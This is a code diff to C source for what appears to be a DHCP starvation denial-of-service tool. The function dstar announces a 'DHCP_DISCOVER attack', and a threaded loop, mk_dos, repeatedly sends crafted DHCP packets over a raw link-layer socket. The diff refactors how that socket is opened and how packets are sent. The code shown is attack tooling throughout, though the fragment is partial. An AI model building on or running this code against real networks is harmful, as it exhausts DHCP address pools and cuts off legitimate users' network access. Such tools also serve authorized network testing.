@@ -90,9 +90,9 @@ int dstar(struct options *opt) {
     }
 
     // Open Socket
-    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
+    if ((sock = llsocket(opt->iface_name)) < 0)
     {
-        fprintf(stderr,"Failed to open socket!\n");
+        perror("llsocket");
         return -1;
     }
 
@@ -106,11 +106,6 @@ int dstar(struct options *opt) {
         dhcpContainer.dhcpPkt.xid=opt->xid;
     memcpy(ethpkt->data+IPV4HDRSIZE+UDPHDRSIZE, &dhcpContainer.dhcpPkt, sizeof(struct dhcp_pkt)); // copy dhcp packet into udp packet
 
-    if(!build_sockaddr_ll(&iface, opt->iface_name, &opt->hwaddr)) {
-        fprintf(stderr,"Error while getting interface index, check interface name!\n");
-        close(sock);
-        return -1;
-    }
     // HERE
     printf("Starting DHCP_DISCOVER attack...");
     struct th_opt tho[2];
@@ -142,7 +137,7 @@ void *mk_dos(void *options) {
     struct dhcp_pkt *dhcp =(struct dhcp_pkt *)(opt->buff+PKTLEN-DHCPPKTLEN);
     while (opt->st && opt->time > 0 && !stop || !opt->st&&!stop) {
         pthread_mutex_lock(&lock);
-        if(sendto(sock, opt->buff, PKTLEN, 0, (struct sockaddr *) &iface, sizeof(struct sockaddr_ll))<0)
+        if(send(sock, opt->buff, PKTLEN, 0)<0)
         {
             fprintf(stderr,"sendto error\n");
             stop = true;
